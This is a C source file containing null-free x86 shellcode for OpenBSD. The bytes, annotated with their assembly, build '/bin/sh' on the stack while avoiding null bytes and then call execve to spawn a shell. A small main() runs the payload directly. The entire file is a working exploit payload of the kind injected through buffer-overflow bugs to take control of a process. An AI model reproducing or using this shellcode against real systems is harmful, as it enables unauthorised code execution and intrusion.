/* 
 * shellcode-nulfree-openbsd-x86.c
 * Created: Mon Apr 24 23:36:02 2000 by tek@wiw.org
 * Revised: Mon Apr 24 23:36:02 2000 (pending)
 * Copyright 2000 Julian E. C. Squires (tek@wiw.org)
 * This program comes with ABSOLUTELY NO WARRANTY.
 * $Id$
 * 
 */

unsigned char shellcode[] = {
    0x55,                               /* pushl %ebp */

    0x8B, 0xEC,                         /* movl %esp,%ebp */

    0x81, 0xC4, 0xF0, 0xFF, 0xFF, 0xFF, /* addl $-16, %esp */

    /* movl $0x6E69622F, -8(%ebp) */
    0xC7, 0x45, 0xF8, 0x2F, 0x62, 0x69, 0x6E,

    /* movl $0xFF68732F, -4(%ebp) */
    0xC7, 0x45, 0xFC, 0x2F, 0x73, 0x68, 0xFF,

    0x83, 0x45, 0xFF, 0x01,             /* addb $0x01, -1(%ebp) */

    0x31, 0xC0,                         /* xorl %eax, %eax */

    0x89, 0x45, 0xF4,                   /* movl %eax, -12(%ebp) */

    0x89, 0x6D, 0xF0,                   /* movl %ebp, -16(%ebp) */

    /* addl $-8, -16(%ebp) */
    0x81, 0x45, 0xF0, 0xF8, 0xFF, 0xFF, 0xFF,

    0x81, 0xC4, 0xFC, 0xFF, 0xFF, 0xFF, /* addl $-4, %esp */

    0x8D, 0x45, 0xF4,                   /* leal -12(%ebp),%eax */

    0x50,                               /* pushl %eax */

    0x8D, 0x45, 0xF0,                   /* leal -16(%ebp),%eax */

    0x50,                               /* pushl %eax */

    0x8B, 0x45, 0xF0,                   /* movl -16(%ebp),%eax */

    0x50,                               /* pushl %eax */

    0x81, 0xC4, 0xFC, 0xFF, 0xFF, 0xFF, /* addl $-4, %esp */

    0x31, 0xC0,                         /* xorl %eax, %eax */

    0x83, 0xC0, 0x3B,                   /* addb $0x3b, %eax */

    0xCD, 0x80                          /* int $0x80 */
};

int main(void)
{
    (*(void(*)(void))shellcode)();
}

/* EOF shellcode-nulfree-openbsd-x86.c */
